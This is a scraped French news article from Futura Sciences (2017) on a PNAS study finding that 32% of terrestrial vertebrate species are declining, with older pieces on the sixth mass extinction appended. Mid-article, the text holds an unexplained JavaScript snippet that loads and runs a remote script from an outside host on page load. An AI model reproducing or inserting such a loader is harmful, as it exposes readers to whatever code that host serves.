{"title": "La sixième extinction de masse des animaux est sous-estimée", "newspaper": "Futura Sciences", "author": "Xavier Demeersman", "date_publi": "11/07/2017", "content": "Pour prendre le pouls du déclin des populations des vertébrés terrestres, trois spécialistes ont étudié l'évolution de leur nombre au sein de 27.600 espèces. Leur approche diffère de celle de l'UICN, et prend en compte le nombre des individus et l'ampleur de leurs aires de répartition. Verdict : 32 % sont en recul. Pour ces chercheurs,  « la réelle ampleur de l'extinction de masse qui touche la faune a été sous-estimée : elle est catastrophique » . Ce qu'il faut retenir Trois chercheurs ont examiné l’évolution des populations de 27.600 espèces de vertébrés terrestres, soit la moitié de toutes celles connues. Ils ont également étudié en détail les populations de 177 espèces de mammifères entre 1900 et 2015, sans se focaliser sur les espèces dites menacées. Les auteurs posent un constat alarmant. La crise est plus grave qu’on ne le pensait. 32 % de ces espèces sont en déclin, y compris celles dites « peu concernées ». Les principales causes sont les pertes d’habitats (déforestation, agriculture, artificialisation des sols, etc.), la chasse et le braconnage, la pollution et désormais, le changement climatique. « Nous constatons que le taux de perte de population des  vertébrés  terrestres est extrêmement élevé, y compris chez les \" espèces  peu concernées\" »  écrivent Gerardo Ceballos, de l'université nationale autonome du Mexique et ses collègues de l'université de Stanford, Paul Ehrlich et Rodolfo Dirzob. Les trois chercheurs tirent la  sonnette  d'alarme dans leur étude qui vient de paraître dans les  Pnas  ( Proceedings of the National Academy of Sciences ). Pour eux, qui travaillent depuis longtemps sur la question d'une sixième crise d'extinction majeure en cours sur  Terre , il s'agit d'un véritable  « anéantissement biologique »  ( biological annihilation ) au vu de son ampleur et de son accélération,  « [elle a été] sous-estimée : elle est catastrophique » . En 2015, Gerardo Ceballos et Paul Ehrlich avaient déjà estimé que les disparitions d'espèces avaient été multipliées par 100 depuis le début du XX e  siècle (voir l'article au bas de celui-ci). Les résultats sont accablants. Ils reposent sur les fluctuations dans les populations de quelque 27.600 espèces de vertébrés terrestres connues, incluant des  mammifères , des oiseaux, des  reptiles  et des  amphibiens . S'y ajoute une analyse très détaillée de l'évolution de la population de 177 mammifères entre 1900 et 2015. Voir aussi : Biodiversité : plus de la moitié des vertébrés ont disparu depuis 1970 Les chimpanzés, comme beaucoup de grands vertébrés, sont menacés dans de nombreuses régions, mais ils sont la face cachée de l'iceberg. En rasant des forêts, les activités humaines font disparaître des écosystèmes entiers, avec leurs végétaux, leurs animaux et leurs micro-organismes. © sivanadar, Shutterstock                               32 % des espèces étudiées sont en déclin Les trois auteurs soulignent qu'ils n'ont pas voulu se concentrer exclusivement sur les espèces menacées. En effet, cette approche est, pour eux, trompeuse car elle  « peut donner l'impression que le biote terrestre n'est pas immédiatement menacé mais qu'il entre juste lentement dans un épisode majeur de perte de  biodiversité  » . Les chercheurs ont préféré mesurer les contractions de leurs populations, que ce soit pour les plus menacées identifiées par l' IUCN , comme pour celles dites « communes » et « peu concernées », car, rappellent-ils,  « [...] la disparition des populations est un prélude à celle des espèces » .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Ainsi ont-ils constaté qu'un tiers, 32 % (précisément 8.851 sur 27.600), des espèces qu'ils ont étudiées, lesquelles représentent environ la moitié de toutes celles connues, sont en déclin. Et cela, autant en effectifs qu'en d' aires de répartition . Pour ce qui est de l'échantillon de 177 mammifères dont les chercheurs précisent qu'ils disposent de données détaillées, les résultats montrent que tous ont perdu 30 % ou plus de leurs territoires et plus de 40 % ont subi de graves diminutions de leur population. “ La disparition des populations est un prélude à celle des espèces. Parmi les exemples les plus représentatifs, citons les  guépards , qui ne sont plus que 7.000 aujourd'hui (contre 100.000 en 1900). Les  lions  aussi : il y a 25 ans, ils étaient 43 % plus nombreux..., à présent, ils ne sont plus que 35.000... Et inutile de dire combien de royaumes cet animal a perdu en l'espace de quelques siècles. Les grands singes aussi sont en recul dont plusieurs comme l' orang-outang  sont « en danger critique », la dernière étape avant l'extinction. Une étude publiée le 7 juillet dans  Scientific Reports  estime qu'à Bornéo, leur population a chuté de 25 % en dix ans seulement. Ils étaient encore 288.500 en 1973 et ne pourraient ne plus être que 47.000 en 2025, si rien n'est fait pour enrayer leur perte d'habitat et l'abattage (jusqu'à 2.500 orangs-outangs sont tués chaque année). Le pourcentage d’espèces en déclin classées par l’UICN comme « en voie de disparition »,  endangered , (y compris « en danger critique d’extinction », « en voie de disparition », « vulnérable » et « proche menacé ») ou de « faibles préoccupations » ( low concern ) chez les vertébrés terrestres. Ce chiffre souligne que même des espèces qui n’ont pas encore été classées comme en voie d’extinction (environ 30 % dans le cas de tous les vertébrés) sont en déclin. Cette situation est plus critique encore pour les oiseaux, dont près de 55 % des espèces en baisse sont toujours classées dans la catégorie « peu préoccupantes ». ©  Pnas                               Une biodiversité en recul partout dans le monde Dans leur enquête, les chercheurs ont établi que toutes les régions du monde sont concernées par le recul des populations. Les impacts les plus visibles sont situés dans les zones qui comptent la plus importante diversité animale : les tropiques. Les taux d'érosion les plus élevés sont observées notamment en Amérique centrale et du Sud, en Indonésie et en Asie du Sud-est. Toutefois, les chiffres sont aussi inquiétants partout ailleurs relativement à la  biodiversité  qui est moindre. Voir aussi : Quand la biodiversité tombe en dessous du minimum vital Les premières causes pointées par ce rapport sont les pertes d'habitats : des territoires volés ou dégradés par l'Homme pour ses besoins.  Déforestation ,  agriculture , routes, urbanisation, exploitations minières et pétrolières, etc. sont les principales menaces pour les  écosystèmes . Revenons sur le cas des orangs-outangs, très symptomatique de la situation :  « 10.000 vivent dans des zones qui ont été allouées par des gouvernements nationaux et locaux au développement de l'huile de palme. Si ces zones sont converties en plantations d'huile de palme, sans changements dans les pratiques actuelles, la plupart de ces 10.000 individus seront détruits et la chute vertigineuse de leur population va probablement continuer » , s'inquiète ainsi Erik Meijaard, de l'université de Queensland et coauteur de l'étude du 7 juillet citée plus haut. Les autres causes sont la chasse et le braconnage, la  surpêche , la pollution (des eaux, des sols, de l' air ), les  espèces invasives  et désormais, le  changement climatique , lequel ne cesse de s'intensifier.  « Les moteurs ultimes de la  sixième extinction de masse  sont moins souvent cités , lancent les trois chercheurs.  Il s'agit de la surpopulation humaine, liée à une croissance continue de la population, et de la surconsommation, en particulier par les riches » . Selon eux,  « nous ne disposons que d'une petite  fenêtre  pour agir, deux ou trois décennies au maximum » . Et bien sûr,  sans la biodiversité , c'est aussi notre espèce que nous mettons en danger :  « L'érosion des espèces entraîne de graves conséquences en cascades sur l'ensemble des écosystèmes, ainsi que des impacts économiques et sociaux pour l'humain » , expliquent-ils. Les chercheurs rappellent aussi qu'en un siècle, 200 espèces de vertébrés se sont déjà éteintes en un siècle.  « Cela représente environ deux espèces par an. Or, si l'on se fie au taux d'extinction \"normal\" de ces deux derniers millions d'années, ces 200 espèces auraient dû mettre jusqu'à 10.000 ans à disparaître » . Pour en savoir plus La sixième extinction de masse aurait commencé Article de  Jean-Luc Goudet  publié le 12 décembre 2016 Au Mexique, à Cancun, se tient jusqu'au 17 décembre la treizième  Convention sur la diversité biologique , alias  COP  13. Elle réunit 196 pays autour de ce problème majeur qu'est la perte d'espèces et, surtout, la réduction des populations. L'écho de ces discussions reste faible. Pourtant, la question devrait nous préoccuper autant que le  réchauffement climatique . À Cancun, au Mexique, 196 délégations venues d'autant de pays sont en train de parler défense de la  biodiversité  dans le cadre de la COP 13, une « conférence des parties » organisée par l'ONU, donc, comme les  COP  dédiées aux mesures à prendre face au réchauffement climatique. La grande différence entre ces deux types de conférences vient du traitement médiatique : celui-ci est bien plus faible dans le cas de la COP 13 que lors des précédentes COP liées au réchauffement climatique. Visiblement, l'intérêt des peuples et des gouvernements pour l'état des espèces vivantes est un cran en dessous. Pourtant, les analyses scientifiques se suivent et se ressemblent ces dernières années. Toutes montrent une augmentation du  nombre d'espèces  en danger, mais aussi comment les écosystèmes s'appauvrissent. La biodiversité d'un écosystème est son équilibre La perte de biodiversité ne s'exprime pas qu'en espèces disparues ou survivantes, mais aussi en effectifs des populations. La  girafe  et le  caribou  de la  toundra , au Canada, font toujours la joie des photographes mais ces deux grands mammifères voient leur nombre d'individus diminuer depuis des décennies jusqu'à atteindre aujourd'hui un niveau qui inquiète les biologistes. Une espèce peut être présente dans de nombreuses régions du monde mais être menacée partout. Elle peut aussi disparaître par endroits sans être pour autant éteinte à l'échelle de la planète. Les  écosystèmes , eux, sont appauvris ou déséquilibrés quand des espèces en deviennent absentes. Les causes sont connues, la principale étant la réduction des espaces vitaux liée à la progression, en surface occupée, des habitats et des activités humaines (agriculture, voie de communication...). Des mesures à l'échelle des nations sont bien sûr possibles et voilà pourquoi des discussions ont lieu à l'ONU à ce propos. Lors de la dixième réunion de la Convention sur la diversité biologique, à Nagoya, au Japon, en 2010, des objectifs avaient été annoncés, comme l'augmentation du nombre d' aires protégées , sur terre (de 17 % avant 2020) et en mer (de 10 %). La création d'une sorte de «  Giec  de la biodiversité », l'IPBES (Fondation pour la recherche sur la biodiversité), a été décidée et est devenue réalité en 2012, mais, globalement, la cause des espèces en danger a peu progressé depuis. Voici quelques éléments au dossier : Biodiversité : plus de la moitié des vertébrés ont disparu depuis 1970 Quand la biodiversité tombe en dessous du minimum vital Vers une sixième extinction de masse ? À Nagoya, le sommet sur la biodiversité se termine sur une bonne note Vivons-nous le début d'une extinction de masse ? Article de Jean-Luc Goudet publié le 22/6/2015 D'après une estimation réalisée par des biologistes américains, le taux d'extinction actuel, pour les espèces de vertébrés, serait bien plus élevé que celui enregistré en période ordinaire. Pour la perte de biodiversité, notre époque correspondrait donc bien à une extinction massive. Mais elle n'en est qu'à son début donc rien n'est joué... La disparition d'espèces causée par les activités humaines, en particulier la destruction des habitats, est incontestable mais quelle est l'ampleur du phénomène ? En permanence, des espèces apparaissent et d'autres disparaissent, et ce à un rythme à peu près constant. Les registres  fossiles  ont cependant montré au moins cinq phases « d' extinction de masse  », attribuées à des circonstances exceptionnelles et, depuis quelque temps, beaucoup parlent d'une «  sixième extinction de masse  » due à l'omniprésence des humains et à leur hyperactivité. Il n'y a cependant pas d'accord sur ces taux d'extinction, difficiles à mesurer. Une équipe de biologistes, du Mexique et des États-Unis, vient de s'atteler à la tâche pour comparer les disparitions de l'époque récente au « taux habituel », c'est-à-dire celui observé entre deux phases d'extinction massive. Les chercheurs expliquent qu'ils ont pris en compte les disparitions de vertébrés, relativement documentées depuis le XVI e  siècle, surtout pour les mammifères, puis celle des oiseaux à partir du XIX e  siècle, et des  poissons ,  amphibiens  et reptiles aux siècles suivants. L’Ophrysie de l'Himalaya ( Ophrysia superciliosa ), unique espèce de son genre, qui ressemble à une perdrix, n'a pas été observée avec certitude depuis 1876. Des témoignages en Inde, aux alentours de Naini Tal en 2003, redonnent espoir et ont permis de relancer les recherches pour tenter de localiser des individus. © Peinture de P. Dougalis, Wikimedia, CC                       Pour les extinctions récentes, l'étude prend comme référence les données de l'Union internationale pour la conservation de la nature ( UICN ), qui publie régulièrement sa fameuse  Liste rouge , avec notamment trois catégories pour classer les espèces les plus mal en point : éteintes (EX), éteintes à l'état sauvage (EXW) et certainement éteintes (PE), quand les données sont insuffisantes. Les auteurs ont retenu deux références, qualifiées de « modeste » et « très modeste » ( « conservative »  et  « very conservative » ), la première sommant les catégories EX, EXW et PE et la seconde ne retenant que la catégorie EX. Le taux d'extinction cumulé d'espèces de vertébrés selon les données de l'UICN, en ne comptabilisant que la catégorie « espèce éteinte » à gauche, et en incluant les catégories « éteinte à l'état sauvage » et « certainement éteinte » à droite. Les courbes de couleurs indiquent les valeurs pour les mammifères ( Mammals ) et les oiseaux ( Birds ), les autres vertébrés ( Others vertebrates ), c'est-à-dire les poissons, les amphibiens et les reptiles, et l'ensemble des vertébrés ( Vertebrates ). La ligne pointillée donne le taux cumulé en période normale ( Background ). © Gerardo Ceballos  et al. ,  Sience Advances , UICN                               Le taux d'extinction actuel est huit à cent fois trop élevé Pour le « taux habituel » d'extinction, les auteurs ont retenu, à partir d'études récentes, une fourchette de 0,1 à 1  espèce éteinte  par million d'espèces et par an. Notée E/MSY, cette unité équivaut, si l'on préfère, à une extinction pour dix mille espèces en un siècle. Les auteurs de l'étude font remarquer que ce taux est deux fois supérieur à celui habituellement retenu. Pour les mammifères, ce taux serait de 1,8 E/MSY, que les auteurs ont arrondi à 2. Avec cette méthode, l'étude, publiée dans la revue  Science Advances , aboutit à un taux d'extinction actuel compris entre huit et cent fois le taux habituel. Par exemple, illustrent les auteurs, un taux de 2 E/MSY aurait conduit à neuf extinctions d'espèces de  vertébrés  depuis 1900 alors que les chiffres de l' UICN , version « modeste », donc avec la seule catégorie EX, en donnent 468 de plus (69 mammifères, 80 oiseaux, 24 reptiles, 146 amphibiens et 158 poissons). Selon ces chercheurs, pas de doute, ce taux correspond à celui d'une extinction massive. Mais, rassurent-ils, elle n'en est qu'à ses débuts et nous avons les moyens de freiner la  perte de biodiversité . Interview : les relations entre l'Homme et la nature                       L’Homme prospère grâce aux ressources offertes par la nature mais il en dépend aussi et doit donc en éviter une utilisation intensive. Xavier Le Roux, directeur de la Fondation pour la recherche sur la biodiversité, décrit au cours de cette interview les relations complexes entre l'Homme et la nature.                                       ", "theme": "planete"}